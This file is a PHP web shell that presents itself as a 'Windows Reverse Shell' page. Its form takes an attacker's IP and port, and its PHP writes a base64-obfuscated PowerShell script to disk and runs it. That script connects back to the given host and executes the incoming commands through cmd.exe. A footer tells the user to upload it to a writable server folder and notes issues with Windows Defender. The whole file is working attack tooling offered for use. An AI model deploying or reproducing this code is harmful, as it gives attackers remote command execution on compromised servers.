<!DOCTYPE html>
<html>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Anonymous+Pro&display=swap" rel="stylesheet">
<head>
	<title>Windows ReverseShell</title>
</head>

<style>
	body {
		background-color: black;
		color:#39FF14;
		font-family: 'Anonymous Pro', monospace;
		text-align:center;
	}
	.art{
		width:100%;
		margin-top:10vh;
	}
	pre {
		color:#7cbb00;
	}
	span[color=red] {
		color: #f65314;
	}
	span[color=blue] {
		color:#00a1f1;
	}
	span[color=yellow] {
		color:#ffbb00;
	}
	form {
		margin:20px;
	}
	form input {
		color:#39FF14;
		padding:10px;
		background-color: #232323;
		border: none;
		outline: none;
		transition:0.3s;
	}
	form input:focus {
		border: none;
		outline: none;
	}
	form input[type=submit]:hover{
		background-color:white;
		color:black;
	}
	.disclaimer {
	   position: fixed; 
	   font-size:70%;    
	   opacity:0.7;
       text-align: center;    
       bottom: 0px; 
       width: 100%;
       margin:0 0 20px 0;
	}
	a {
		text-decoration: none;
		color:#00a1f1;
	}
</style>

<body>
<div class="art">
<pre>
                  .oodMMMMMMMMMMMMM
<span color=red>      ..oodMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>oodMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
 
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>`^^^^^^MMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>      ````^^^^</span>  <span color=yellow>^^MMMMMMMMMMMMMMMMM</span>
                      <span color=yellow>````^^^^^^MMMM</span>
</pre>
Windows Reverse Shell
</div>

<form action="" method="GET">
	<input type="text" name="ip" placeholder="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
	<input type="text" name="port" placeholder="31337">
	<input type="submit" value=">>">
</form>
<p class="disclaimer">
	This obviously only works with Windows Servers. <br>These might not work with win servers that has enabled WindowsDefender. <br>Upload this in a writable folder | Coded by <a href="https://github.com/bloos3rpent">Bloos3rpent</a>
	</p>
</body>

</html>


<?php

function rshell($ip, $port){
	$rev = base64_decode('JHNvY2tldCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudCgn').$ip."', ".$port.
	base64_decode('KTsKaWYoJHNvY2tldCAtZXEgJG51bGwpe2V4aXQgMX0KJHN0cmVhbSA9ICRzb2NrZXQuR2V0U3RyZWFtKCk7CiR3cml0ZXIgPSBuZXctb2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIoJHN0cmVhbSk7CiRidWZmZXIgPSBuZXctb2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsKJGVuY29kaW5nID0gbmV3LW9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nOwokZGF0ZSA9IEdldC1EYXRlOwokd3JpdGVyLldyaXRlTGluZSgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7CiR3cml0ZXIuV3JpdGVMaW5lKCJbK10gQ29ubmVjdGlvbiBFc3RhYmxpc2hlZCIpOwokd3JpdGVyLldyaXRlTGluZSgiWytdIFdlbGNvbWUgdG8gQmxvb3MzcnBlbnQgUmV2ZXJzZSBTaGVsbCIpOwokd3JpdGVyLldyaXRlTGluZSgiWytdIEN1cnJlbnQgRGF0ZTogJGRhdGUiKTsKJHdyaXRlci5Xcml0ZUxpbmUoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpOwokd3JpdGVyLldyaXRlTGluZSgiICIpOwpkbwp7CgkkcHdkID0gR2V0LUxvY2F0aW9uOwoJJHdyaXRlci5Xcml0ZSgiJHB3ZD4gIik7Cgkkd3JpdGVyLkZsdXNoKCk7CgkkcmVhZCA9ICRudWxsOwoJJHJlcyA9ICIiCgl3aGlsZSgkc3RyZWFtLkRhdGFBdmFpbGFibGUgLW9yICRyZWFkIC1lcSAkbnVsbCkgewoJCSRyZWFkID0gJHN0cmVhbS5SZWFkKCRidWZmZXIsIDAsIDEwMjQpCgl9Cgkkb3V0ID0gJGVuY29kaW5nLkdldFN0cmluZygkYnVmZmVyLCAwLCAkcmVhZCkuUmVwbGFjZSgiYHJgbiIsIiIpLlJlcGxhY2UoImBuIiwiIik7CglpZighJG91dC5lcXVhbHMoImV4aXQiKSl7CgkJJGFyZ3MgPSAiIjsKCQlpZigkb3V0LkluZGV4T2YoJyAnKSAtZ3QgLTEpewoJCQkkYXJncyA9ICRvdXQuc3Vic3RyaW5nKCRvdXQuSW5kZXhPZignICcpKzEpOwoJCQkkb3V0ID0gJG91dC5zdWJzdHJpbmcoMCwkb3V0LkluZGV4T2YoJyAnKSk7CgkJCWlmKCRhcmdzLnNwbGl0KCcgJykubGVuZ3RoIC1ndCAxKXsKICAgICAgICAgICAgICAgICRwaW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8KICAgICAgICAgICAgICAgICRwaW5mby5GaWxlTmFtZSA9ICJjbWQuZXhlIgogICAgICAgICAgICAgICAgJHBpbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9ICR0cnVlCiAgICAgICAgICAgICAgICAkcGluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9ICR0cnVlCiAgICAgICAgICAgICAgICAkcGluZm8uVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlCiAgICAgICAgICAgICAgICAkcGluZm8uQXJndW1lbnRzID0gIi9jICRvdXQgJGFyZ3MiCiAgICAgICAgICAgICAgICAkcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MKICAgICAgICAgICAgICAgICRwLlN0YXJ0SW5mbyA9ICRwaW5mbwogICAgICAgICAgICAgICAgJHAuU3RhcnQoKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkcC5XYWl0Rm9yRXhpdCgpCiAgICAgICAgICAgICAgICAkc3Rkb3V0ID0gJHAuU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCkKICAgICAgICAgICAgICAgICRzdGRlcnIgPSAkcC5TdGFuZGFyZEVycm9yLlJlYWRUb0VuZCgpCiAgICAgICAgICAgICAgICBpZiAoJHAuRXhpdENvZGUgLW5lIDApIHsKICAgICAgICAgICAgICAgICAgICAkcmVzID0gJHN0ZGVycgogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcmVzID0gJHN0ZG91dAogICAgICAgICAgICAgICAgfQoJCQl9CgkJCWVsc2V7CgkJCQkkcmVzID0gKCYiJG91dCIgIiRhcmdzIikgfCBvdXQtc3RyaW5nOwoJCQl9CgkJfQoJCWVsc2V7CgkJCSRyZXMgPSAoJiIkb3V0IikgfCBvdXQtc3RyaW5nOwoJCX0KCQlpZigkcmVzIC1uZSAkbnVsbCl7CiAgICAgICAgJHdyaXRlci5Xcml0ZUxpbmUoJHJlcykKICAgIH0KCX0KfVdoaWxlICghJG91dC5lcXVhbHMoImV4aXQiKSkKJHdyaXRlci5jbG9zZSgpOwokc29ja2V0LmNsb3NlKCk7CiRzdHJlYW0uRGlzcG9zZSgp');
	$file = fopen('rev.ps1','w');
	fwrite($file,$rev);
	fclose($file);
	echo shell_exec('powershell -c ".\rev.ps1"');
}


if (isset($_GET['ip']) && isset($_GET['port'])) {
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	rshell($ip, $port);
}
else {
	echo '<script>alert`DO NOT RECODE!\r\n\r\n- Bloos3rpent`</script>';
}

?>